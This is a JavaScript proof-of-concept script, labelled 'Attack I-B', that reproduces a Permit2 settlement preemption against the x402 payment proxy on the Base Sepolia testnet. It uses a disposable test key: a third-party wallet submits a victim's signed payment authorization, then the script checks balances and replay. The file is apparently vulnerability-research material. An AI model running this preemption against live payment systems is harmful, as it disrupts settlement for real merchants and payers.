/**
 * Attack I-B: Permit2 settlement preemption on Base Sepolia.
 *
 * Set ALICE_PRIVATE_KEY to a disposable Base Sepolia test wallet. The script
 * only logs public data.
 */

import { ethers } from "ethers";

// Use the proxy address and ABI exported by @x402/evm.
import {
  x402ExactPermit2ProxyAddress,
  x402ExactPermit2ProxyABI,
} from "@x402/evm";

// Base Sepolia payer key. Use a disposable test wallet.
const ALICE_PRIVATE_KEY = "0x<PASTE_64_HEX_BASE_SEPOLIA_TEST_KEY_HERE>";

const RPC_URL = "https://sepolia.base.org";
const CHAIN_ID = 84532;
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const PROXY_ADDRESS = x402ExactPermit2ProxyAddress;
const USDC_ADDRESS = "0x036CbD53842c5426634e7929541eC2318f3dCF7e";    // Base Sepolia USDC
const PAY_TO = "0xA3669FfBBa16Eb5394fcE56C831cF8C4495c9de6";          // arbitrary merchant payTo
const PAYMENT_AMOUNT = "100";                                          // 100 units = $0.0001 USDC (6 decimals)
const EXPLORER_BASE = "https://sepolia.basescan.org";

function requirePrivateKey() {
  if (!/^0x[0-9a-fA-F]{64}$/.test(ALICE_PRIVATE_KEY)) {
    console.error(
      "ERROR: ALICE_PRIVATE_KEY placeholder not replaced.\n" +
        "Open this file and set ALICE_PRIVATE_KEY to a Base Sepolia test key\n" +
        "(0x followed by 64 hex characters)."
    );
    process.exit(1);
  }
  return ALICE_PRIVATE_KEY;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}...${a.slice(-4)}`;
}

function log(label, msg) {
  const ts = new Date().toISOString().slice(11, 23);
  console.log(`[${ts}] [${label.padEnd(7)}] ${msg}`);
}

function section(title) {
  console.log(`\n${"=".repeat(76)}`);
  console.log(`  ${title}`);
  console.log(`${"=".repeat(76)}\n`);
}

async function getBalances(usdc, aliceAddr) {
  const [aliceBal, payToBal] = await Promise.all([
    usdc.balanceOf(aliceAddr),
    usdc.balanceOf(PAY_TO),
  ]);
  return { aliceBal, payToBal };
}

function logBalances(label, b, aliceAddr) {
  log(label, `Alice  (${shortAddr(aliceAddr)}) USDC: ${ethers.formatUnits(b.aliceBal, 6)}`);
  log(label, `PayTo  (${shortAddr(PAY_TO)}) USDC: ${ethers.formatUnits(b.payToBal, 6)}`);
}

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
];

const PROXY_ABI = x402ExactPermit2ProxyABI;

const PERMIT2_WITNESS_TYPES = {
  PermitWitnessTransferFrom: [
    { name: "permitted", type: "TokenPermissions" },
    { name: "spender", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
    { name: "witness", type: "Witness" },
  ],
  TokenPermissions: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint256" },
  ],
  Witness: [
    { name: "to", type: "address" },
    { name: "validAfter", type: "uint256" },
  ],
};

async function main() {
  const ALICE_PK = requirePrivateKey();

  section("Permit2 settlement preemption");
  log("INFO", "Target contract : x402ExactPermit2Proxy");
  log("INFO", `Target address  : ${PROXY_ADDRESS}`);
  log("INFO", "Address source  : import { x402ExactPermit2ProxyAddress } from '@x402/evm'");
  log("INFO", "SDK package     : @x402/evm");
  log("INFO", `Chain ID        : ${CHAIN_ID} (Base Sepolia)`);
  log("INFO", `Payment amount  : ${PAYMENT_AMOUNT} units (${ethers.formatUnits(PAYMENT_AMOUNT, 6)} USDC)`);

  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const alice = new ethers.Wallet(ALICE_PK, provider);
  // Use a fresh caller wallet for the direct settlement transaction.
  const caller = new ethers.Wallet(ethers.Wallet.createRandom().privateKey, provider);
  const usdc = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, provider);
  const proxy = new ethers.Contract(PROXY_ADDRESS, PROXY_ABI, provider);

  log("INFO", `Alice address   : ${alice.address}`);
  log("INFO", `Caller address  : ${caller.address}`);
  log("INFO", `PayTo address   : ${PAY_TO}`);

  section("Prerequisites");

  const [aliceEth, callerEth] = await Promise.all([
    provider.getBalance(alice.address),
    provider.getBalance(caller.address),
  ]);

  log("SETUP", `Alice ETH       : ${ethers.formatEther(aliceEth)}`);
  log("SETUP", `Caller ETH      : ${ethers.formatEther(callerEth)}`);

  if (aliceEth < ethers.parseEther("0.0003")) {
    console.error(
      "ERROR: Alice needs Base Sepolia ETH for gas. Fund her at https://www.alchemy.com/faucets/base-sepolia"
    );
    process.exit(1);
  }

  if (callerEth < ethers.parseEther("0.00005")) {
    log("SETUP", "Funding caller with 0.00015 ETH for gas");
    const fundTx = await alice.sendTransaction({
      to: caller.address,
      value: ethers.parseEther("0.00015"),
    });
    await fundTx.wait();
    log("SETUP", `Caller fund tx  : ${EXPLORER_BASE}/tx/${fundTx.hash}`);
  }

  const allowance = await usdc.allowance(alice.address, PERMIT2_ADDRESS);
  if (allowance < BigInt(PAYMENT_AMOUNT)) {
    log("SETUP", "Approving Permit2 for max USDC...");
    const usdcAlice = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, alice);
    const approveTx = await usdcAlice.approve(PERMIT2_ADDRESS, ethers.MaxUint256);
    await approveTx.wait();
    log("SETUP", `Approve tx      : ${EXPLORER_BASE}/tx/${approveTx.hash}`);
  } else {
    log("SETUP", "Permit2 allowance already present");
  }

  const proxyPermit2 = await proxy.PERMIT2();
  log("SETUP", `Proxy -> PERMIT2: ${proxyPermit2}`);

  section("Balances before");
  const before = await getBalances(usdc, alice.address);
  logBalances("BEFORE", before, alice.address);

  section("Sign Permit2 authorization");

  const now = Math.floor(Date.now() / 1000);
  const nonce = BigInt(ethers.hexlify(ethers.randomBytes(32)));
  const validAfter = BigInt(now - 600);
  const deadline = BigInt(now + 300);

  const domain = {
    name: "Permit2",
    chainId: CHAIN_ID,
    verifyingContract: PERMIT2_ADDRESS,
  };

  const message = {
    permitted: {
      token: ethers.getAddress(USDC_ADDRESS),
      amount: BigInt(PAYMENT_AMOUNT),
    },
    spender: ethers.getAddress(PROXY_ADDRESS),
    nonce,
    deadline,
    witness: {
      to: ethers.getAddress(PAY_TO),
      validAfter,
    },
  };

  log("SIGN", `nonce      : ${nonce.toString().slice(0, 20)}...`);
  log("SIGN", `deadline   : ${deadline.toString()} (${new Date(Number(deadline) * 1000).toISOString()})`);
  log("SIGN", `spender    : ${PROXY_ADDRESS}`);
  log("SIGN", `token      : ${USDC_ADDRESS}`);
  log("SIGN", `amount     : ${PAYMENT_AMOUNT}`);
  log("SIGN", `witness.to : ${PAY_TO}`);
  log("SIGN", "Witness fields: {to, validAfter}");

  const signature = await alice.signTypedData(domain, PERMIT2_WITNESS_TYPES, message);
  log("SIGN", `signature  : ${signature.slice(0, 20)}...${signature.slice(-8)}`);

  // This is the x402 payload used in the X-PAYMENT header.
  const x402Payload = {
    x402Version: 2,
    payload: {
      signature,
      permit2Authorization: {
        from: alice.address,
        permitted: { token: USDC_ADDRESS, amount: PAYMENT_AMOUNT },
        spender: PROXY_ADDRESS,
        nonce: nonce.toString(),
        deadline: deadline.toString(),
        witness: { to: PAY_TO, validAfter: validAfter.toString() },
      },
    },
  };
  const encodedPayment = Buffer.from(JSON.stringify(x402Payload)).toString("base64");
  log("SIGN", `X-PAYMENT (b64, first 60): ${encodedPayment.slice(0, 60)}...`);

  section("Submit settle from caller wallet");

  log("SETTLE", "Submitting settle() with the signed Permit2 payload.");

  const proxyCaller = new ethers.Contract(PROXY_ADDRESS, PROXY_ABI, caller);
  const settleArgs = [
    {
      permitted: { token: ethers.getAddress(USDC_ADDRESS), amount: BigInt(PAYMENT_AMOUNT) },
      nonce,
      deadline,
    },
    alice.address,
    { to: ethers.getAddress(PAY_TO), validAfter },
    signature,
  ];

  let attackTxHash = null;
  let attackBlock = null;
  let attackGasUsed = null;
  let attackSuccess = false;

  try {
    log("SETTLE", "Calling settle()...");
    const attackTx = await proxyCaller.settle(...settleArgs);
    attackTxHash = attackTx.hash;
    log("SETTLE", `tx submitted    : ${EXPLORER_BASE}/tx/${attackTxHash}`);
    const receipt = await attackTx.wait();
    attackBlock = receipt.blockNumber;
    attackGasUsed = receipt.gasUsed.toString();
    attackSuccess = receipt.status === 1;
    log("SETTLE", `tx confirmed    : block ${attackBlock}, gas ${attackGasUsed}, status ${receipt.status}`);
  } catch (err) {
    log("SETTLE", `settle() FAILED : ${err.shortMessage || err.message}`);
  }

  section("Balances after");
  const after = await getBalances(usdc, alice.address);
  logBalances("AFTER", after, alice.address);

  const aliceLoss = before.aliceBal - after.aliceBal;
  const payToGain = after.payToBal - before.payToBal;
  log("DELTA", `Alice lost      : ${ethers.formatUnits(aliceLoss, 6)} USDC`);
  log("DELTA", `PayTo gained    : ${ethers.formatUnits(payToGain, 6)} USDC`);

  section("Replay settle");
  log("REPLAY", "Calling settle() again with the same signature.");

  let replayReverted = false;
  let replayError = null;
  try {
    const proxyAlice = new ethers.Contract(PROXY_ADDRESS, PROXY_ABI, alice);
    const replayTx = await proxyAlice.settle(...settleArgs);
    await replayTx.wait();
    log("REPLAY", "Replay succeeded; result is inconclusive");
  } catch (err) {
    replayReverted = true;
    replayError = err.shortMessage || err.message;
    log("REPLAY", "settle() reverted");
    log("REPLAY", `reason          : ${replayError}`);
  }

  section("Result");

  const vulnerable = attackSuccess && aliceLoss > 0n && replayReverted;

  if (vulnerable) {
    console.log("  [OBSERVED] Permit2 preemption reproduced on Base Sepolia\n");
    console.log(`    - Caller wallet successfully called settle()`);
    console.log(`    - Alice was charged ${ethers.formatUnits(aliceLoss, 6)} USDC`);
    console.log(`    - Replay settle() reverted`);
    console.log(`    - Settlement tx: ${EXPLORER_BASE}/tx/${attackTxHash}`);
    console.log(`    BLOCK:      ${attackBlock}`);
  } else {
    console.log("  [NO OBSERVATION] condition not reproduced in this run\n");
  }

  console.log("");
}

main().catch((err) => {
  console.error("Fatal error:", err);
  process.exit(1);
});
